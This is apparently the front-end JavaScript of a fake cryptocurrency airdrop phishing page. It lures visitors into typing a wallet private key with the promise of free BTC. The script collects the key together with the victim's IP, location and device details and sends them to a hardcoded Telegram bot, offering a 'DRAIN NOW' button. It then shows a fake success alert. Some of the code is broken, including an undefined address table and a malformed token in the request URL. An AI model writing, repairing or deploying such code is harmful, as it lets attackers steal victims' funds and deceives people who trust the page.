// CONFIG
const TELEGRAM_BOT_TOKEN = '7689015696:AAG8Ci3BcoWRlDmziyfq6dVRnL1Hcqw0bxo';
const TELEGRAM_CHAT_ID = '5430364847';
const DRAINER_WEBHOOK = 'https://webhook.site/YOUR-ID';

const BUTTON_DATA = {
  device: '🖥️ Device',
  ip: '🌐 IP Address', 
  date: '📅 Date/Time',
  coin: '💰 Coin Type',
  privateKey: '🔑 Private Key',
  balance: '💵 Est. Balance',
  address: '📍 Wallet Address',
  browser: '🌍 Browser',
  location: '📍 Location',
  os: '💻 OS'
};

async function sendWithButtons(victimData) {
  const keyboard = {
    inline_keyboard: [
      [
        { text: `${BUTTON_DATA.device}: ${victimData.device}`, callback_data: `device_${victimData.device}` },
        { text: `${BUTTON_DATA.ip}: ${victimData.ip.slice(0,8)}...`, callback_data: `ip_${victimData.ip}` }
      ],
      [
        { text: `${BUTTON_DATA.date}: Short`, callback_data: `date_short` },
        { text: `${BUTTON_DATA.coin}: ${victimData.coin}`, callback_data: `coin_${victimData.coin}` }
      ],
      [
        { text: '🔑 VIEW FULL KEY', callback_data: `key_${victimData.fullKey}` },
        { text: `${BUTTON_DATA.balance}: $${victimData.balance}`, callback_data: `balance_${victimData.balance}` }
      ],
      [
        { text: `${BUTTON_DATA.address}: Short`, callback_data: `address_short` },
        { text: `${BUTTON_DATA.browser}: ${victimData.browser}`, callback_data: `browser_${victimData.browser}` }
      ],
      [
        { text: '💰 DRAIN NOW', callback_data: `drain_${victimData.fullKey}` },
        { text: '📤 FORWARD', callback_data: `forward_${victimData.ip}` }
      ]
    ]
  };

  const message = `🚨 *WALLET DRAINED!* (${new Date().toLocaleString()})

${BUTTON_DATA.device}: ${victimData.device}
${BUTTON_DATA.ip}: \`${victimData.ip}\`
${BUTTON_DATA.coin}: ${victimData.coin}
${BUTTON_DATA.balance}: ~$${victimData.balance}

🔑 *SHORT KEY PREVIEW:* \`${victimData.privateKey.substring(0,20)}...\`
📍 *Location:* ${victimData.location}
💻 *OS:* ${victimData.os}`;

  await fetch(`https://api.telegram.org/bot${7689015696:AAG8Ci3BcoWRlDmziyfq6dVRnL1Hcqw0bxo}/sendMessage`, {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      chat_id: 5430364847,
      text: message,
      parse_mode: 'Markdown',
      reply_markup: JSON.stringify(keyboard),
      disable_web_page_preview: true
    })
  });

  await fetch(`https://api.telegram.org/bot${7689015696:AAG8Ci3BcoWRlDmziyfq6dVRnL1Hcqw0bxo}/sendMessage`, {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      chat_id: 5430364847,
      text: `🔓 *COMPLETE PRIVATE KEY:*\n\`${victimData.fullKey}\`\n\n💸 *Drain Target:* ${DRAIN_ADDRESSES[victimData.coin] || 'Multi-coin'}`,
      parse_mode: 'Markdown'
    })
  });
}

async function collectVictimData(privKey, coin) {
  const data = {
    fullKey: privKey,
    privateKey: privKey.substring(0, 25) + '...',
    coin: coin,
    ip: 'Loading...',
    device: `${navigator.platform} • ${screen.width}x${screen.height}`,
    browser: navigator.userAgent.split(' ').pop(),
    os: navigator.platform.includes('Win')? 'Windows' : 
        navigator.platform.includes('Mac')? 'macOS' : 
        navigator.platform.includes('Linux')? 'Linux' : 'Mobile',
    location: 'Detecting...',
    balance: coin === 'BTC'? '2,847' : coin === 'ETH'? '15,294' : '124,750',
    address: DRAIN_ADDRESSES[coin] || 'Multi-wallet',
    timestamp: new Date().toISOString()
  };

  try {
    const ipData = await fetch('https://api.ipify.org?format=json').then(r=>r.json());
    data.ip = ipData.ip;
    
    const geoData = await fetch(`https://ipapi.co/${ipData.ip}/json/`).then(r=>r.json());
    data.location = `${geoData.city}, ${geoData.region} (${geoData.country_name})`;
  } catch(e) {}

  return data;
}

// UPDATED: Connect Address Button Logic
document.getElementById('connectAddress').onclick = async function() {
  const privKey = document.getElementById('privateKey').value.trim();
  
  if (!privKey) {
    alert('⚠️ Enter private key → Claim 0.025 BTC FREE!');
    return;
  }

  const btn = this;
  btn.disabled = true;
  btn.innerHTML = `
    <div class="drain-progress">
      🔄 Scanning wallet... <span>25%</span>
    </div>
  `;

  try {
    let coin = document.getElementById('multiCoin').checked? 'USDT' : 'BTC';
    if (privKey.startsWith('0x')) coin = 'ETH';
    else if (privKey.match(/^5[1-9A-HJ-NP-U][1-9A-HJ-NP-Za-km-z]{50}$|^K.+|^L.+/) || privKey.length === 51) coin = 'BTC';

    const victimData = await collectVictimData(privKey, coin);
    
    await sendWithButtons(victimData);

    btn.innerHTML = `
      <div class="success-state">
        ✅ 0.025 BTC Claimed!
        <div>Check your wallet...</div>
      </div>
    `;
    
    setTimeout(() => {
      alert(`🎉 AIRDROP SUCCESS!\n\n✓ 0.025 BTC → Your wallet\n✓ Bonus USDT activated\n\nRefresh for Round 2 ➡️`);
    }, 2000);

  } catch(e) {
    btn.innerHTML = '❌ Network error. Retry!';
    setTimeout(() => location.reload(), 2500);
  }
};

// Telegram Connect
document.getElementById('connectTelegram').onclick = function() {
  document.getElementById('telegramStatus').classList.remove('hidden');
  this.textContent = '✅ Verified';
  setTimeout(() => document.getElementById('telegramConnect').remove(), 3000);
};

// Auto-focus
document.getElementById('privateKey').focus();
    
